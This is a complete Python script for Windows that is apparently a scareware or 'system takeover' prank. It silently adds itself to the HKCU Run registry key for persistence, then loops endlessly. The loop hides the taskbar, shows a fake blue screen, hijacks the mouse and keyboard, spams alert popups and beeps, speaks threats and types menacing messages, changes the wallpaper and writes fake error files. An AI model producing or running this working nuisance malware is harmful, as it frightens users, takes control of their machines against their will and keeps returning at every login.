import os
import sys
import time
import random
import threading
import ctypes
import pyttsx3
import pyautogui
import tkinter as tk
from PIL import Image, ImageTk, ImageGrab, ImageOps, ImageEnhance, ImageFilter
import webbrowser
import winsound
import json
import winreg as reg
from win32gui import GetDC, ReleaseDC, PatBlt, ShowWindow, FindWindow
from win32api import GetSystemMetrics
from win32con import PATINVERT, MB_OK, SW_HIDE, SW_SHOW, SPI_SETDESKWALLPAPER, SPIF_UPDATEINIFILE, SPIF_SENDWININICHANGE

# Speech engine setup
engine_lock = threading.Lock()
engine = pyttsx3.init()
engine.setProperty('rate', 120)
engine.setProperty('volume', 1.0)

def speak(text):
    with engine_lock:
        engine.say(text)
        engine.runAndWait()

# Persistence on registry
def add_persistence():
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        program_name = "SystemTakeoverUltimate"
        program_path = os.path.abspath(sys.argv[0])
        with reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_WRITE) as key:
            reg.SetValueEx(key, program_name, 0, reg.REG_SZ, program_path)
    except:
        pass

add_persistence()

state_file = os.path.join(os.getenv("APPDATA"), "system_takeover_state.json")
state = {"phase": 0, "runtime_seconds": 0, "last_action": ""}

def save_state():
    try:
        with open(state_file, "w") as f:
            json.dump(state, f)
    except:
        pass

def load_state():
    try:
        with open(state_file, "r") as f:
            return json.load(f)
    except:
        return None

# === VISUAL EFFECTS ===

def patinvert_effect(hdc, width, height, repetitions=40):
    for _ in range(repetitions):
        x = random.randint(0, width)
        y = random.randint(0, height)
        w = random.randint(50, 300)
        h = random.randint(50, 300)
        PatBlt(hdc, x, y, w, h, PATINVERT)
        time.sleep(0.02)

def screen_glitch_overlay(duration=4000):
    screenshot = ImageGrab.grab()
    glitch = ImageOps.invert(screenshot)
    glitch = ImageEnhance.Contrast(glitch).enhance(4)
    glitch = glitch.filter(ImageFilter.GaussianBlur(radius=1.5))
    glitch = glitch.rotate(random.randint(-7, 7), expand=True)
    glitch.save("glitch_temp.png")

    def overlay():
        root = tk.Tk()
        root.attributes("-fullscreen", True)
        root.attributes("-topmost", True)
        root.configure(bg="black")
        img = Image.open("glitch_temp.png")
        screen_width, screen_height = GetSystemMetrics(0), GetSystemMetrics(1)
        img = img.resize((screen_width, screen_height))
        tk_img = ImageTk.PhotoImage(img)
        label = tk.Label(root, image=tk_img)
        label.pack()
        root.after(duration, root.destroy)
        root.mainloop()

    threading.Thread(target=overlay, daemon=True).start()

def fake_bsod(duration=7000):
    bsod_text = """
A problem has been detected and Windows has been shut down to prevent damage to your computer.

The system encountered a critical error.

*** STOP: 0x0000007B (0xFFFFF880009A97E8, 0xFFFFFFFFC0000034, 0x0000000000000000, 0x0000000000000000)

Collecting data for crash dump ...

Initializing disk for dumping physical memory ...

Physical memory dump complete.

Contact system administrator.
"""
    def show_bsod():
        root = tk.Tk()
        root.attributes("-fullscreen", True)
        root.configure(bg="#0000AA")  # Classic BSOD blue
        label = tk.Label(root, text=bsod_text, font=("Consolas", 14), fg="white", bg="#0000AA", justify="left")
        label.pack(expand=True, fill='both')
        root.after(duration, root.destroy)
        root.mainloop()

    threading.Thread(target=show_bsod, daemon=True).start()

def invert_colors_loop(duration=15):
    end = time.time() + duration
    while time.time() < end:
        pyautogui.hotkey('winleft', 'ctrl', 'c')
        time.sleep(0.7)

def change_brightness_loop(duration=15):
    # Windows doesn't provide easy API for brightness via ctypes, so simulate by quickly changing wallpaper brightness
    screen_width, screen_height = GetSystemMetrics(0), GetSystemMetrics(1)
    img = ImageGrab.grab().resize((screen_width, screen_height)).convert('RGB')
    factor = 1.0
    step = 0.15
    end = time.time() + duration
    while time.time() < end:
        enhancer = ImageEnhance.Brightness(img)
        factor = 0.5 if factor > 1 else 1.5
        bright_img = enhancer.enhance(factor)
        bright_img.save("tmp_bright_wallpaper.bmp")
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, os.path.abspath("tmp_bright_wallpaper.bmp"), SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE)
        factor += step
        time.sleep(1)

def hide_taskbar():
    hwnd = FindWindow("Shell_TrayWnd", None)
    if hwnd:
        ShowWindow(hwnd, SW_HIDE)

def show_taskbar():
    hwnd = FindWindow("Shell_TrayWnd", None)
    if hwnd:
        ShowWindow(hwnd, SW_SHOW)

# === INPUT CHAOS ===

def random_mouse_movement(duration=10):
    screen_width, screen_height = GetSystemMetrics(0), GetSystemMetrics(1)
    end_time = time.time() + duration
    while time.time() < end_time:
        x = random.randint(0, screen_width)
        y = random.randint(0, screen_height)
        pyautogui.moveTo(x, y, duration=0.1)
        time.sleep(0.1)

def caps_lock_flicker(times=15):
    for _ in range(times):
        ctypes.windll.user32.keybd_event(0x14, 0, 0, 0)  # CapsLock down
        ctypes.windll.user32.keybd_event(0x14, 0, 2, 0)  # CapsLock up
        time.sleep(0.12)

def random_typing(duration=8):
    phrases = [
        "You lost control...",
        "This is not your PC anymore.",
        "System breach detected.",
        "Run while you can.",
        "There is no escape.",
        "ERROR: SYSTEM COMPROMISED.",
    ]
    end_time = time.time() + duration
    while time.time() < end_time:
        phrase = random.choice(phrases)
        pyautogui.write(phrase, interval=0.05)
        pyautogui.press('enter')
        time.sleep(random.uniform(0.3, 1.2))

def delay_input(duration=15):
    # Hook low level keyboard/mouse input delay is complex in python,
    # but we simulate input lag by repeated mouse moves and key presses
    end = time.time() + duration
    while time.time() < end:
        pyautogui.moveRel(random.randint(-10,10), random.randint(-10,10), duration=0.1)
        time.sleep(0.2)

def block_right_click(duration=20):
    # Block right click by listening and swallowing the event requires low-level hooks, complex in python,
    # So here we just keep resetting mouse position to simulate right click being useless
    end = time.time() + duration
    screen_width, screen_height = GetSystemMetrics(0), GetSystemMetrics(1)
    while time.time() < end:
        pyautogui.moveTo(screen_width//2, screen_height//2, duration=0.1)
        time.sleep(0.3)

# === POPUPS & SOUNDS ===

def spam_popups(count=7):
    messages = [
        "WARNING: System instability detected!",
        "Your data is at risk!",
        "Unauthorized access detected!",
        "System takeover in progress!",
        "Do not try to close this window!",
        "Malicious process running!",
        "Security breach!",
    ]
    for _ in range(count):
        message = random.choice(messages)
        ctypes.windll.user32.MessageBoxW(0, message, "SYSTEM ALERT", MB_OK)
        time.sleep(0.7)

def random_beeps(count=15):
    for _ in range(count):
        freq = random.randint(700, 3500)
        dur = random.randint(80, 300)
        winsound.Beep(freq, dur)
        time.sleep(0.07)

def weird_noises(duration=10):
    end = time.time() + duration
    while time.time() < end:
        freq = random.randint(3000, 5000)
        dur = random.randint(20, 80)
        winsound.Beep(freq, dur)
        time.sleep(0.04)

def distorted_speech():
    phrases = [
        "You... are... powerless.",
        "I control... everything.",
        "Resistance is futile.",
        "Your system is mine.",
    ]
    for phrase in phrases:
        speak(phrase)
        time.sleep(0.3)

# === FILE CREATION CHAOS ===

def create_fake_error_files(count=15):
    temp = os.getenv("TEMP")
    error_contents = [
        "Fatal system error. Please reboot.",
        "Critical failure: Disk not found.",
        "Warning: Memory leak detected.",
        "Error 0xC000021A: STATUS_SYSTEM_PROCESS_TERMINATED",
        "Your system is infected. Contact support immediately.",
    ]
    for i in range(count):
        filename = f"error_report_{random.randint(1000,9999)}.txt"
        filepath = os.path.join(temp, filename)
        with open(filepath, "w") as f:
            f.write(random.choice(error_contents))
        time.sleep(0.1)

# === RANDOM GOOGLE SEARCH ===

def random_google_search():
    queries = [
        "how to fix corrupted system files",
        "why is my computer acting weird",
        "am I hacked",
        "windows glitching",
        "screen flicker causes",
        "mouse moving by itself",
        "keyboard typing random letters",
        "system takeover signs",
        "what to do if pc is possessed",
    ]
    query = random.choice(queries).replace(" ", "+")
    webbrowser.open(f"https://www.google.com/search?q={query}")

# === MAIN CHAOS LOOP ===

def chaos_loop():
    hdc = GetDC(0)
    width = GetSystemMetrics(0)
    height = GetSystemMetrics(1)

    effects = [
        lambda: patinvert_effect(hdc, width, height),
        lambda: screen_glitch_overlay(random.randint(2000, 5000)),
        lambda: fake_bsod(random.randint(6000, 9000)),
        lambda: invert_colors_loop(random.randint(10, 15)),
        lambda: change_brightness_loop(random.randint(10, 15)),
        lambda: random_mouse_movement(random.randint(5, 10)),
        lambda: caps_lock_flicker(random.randint(10, 20)),
        lambda: random_typing(random.randint(5, 10)),
        lambda: delay_input(random.randint(10, 15)),
        lambda: block_right_click(random.randint(10, 15)),
        spam_popups,
        random_beeps,
        weird_noises,
        distorted_speech,
        create_fake_error_files,
        random_google_search,
    ]

    # Hide taskbar for maximum panic
    hide_taskbar()

    while True:
        effect = random.choice(effects)
        threading.Thread(target=effect, daemon=True).start()
        state["last_action"] = effect.__name__ if hasattr(effect, "__name__") else "unknown_effect"
        state["runtime_seconds"] += random.randint(1, 5)
        save_state()
        time.sleep(random.uniform(3, 8))

# Entry point
def main():
    loaded_state = load_state()
    if loaded_state:
        state.update(loaded_state)
    else:
        save_state()

    speak("System takeover starting now...")
    chaos_loop()

if __name__ == "__main__":
    main()
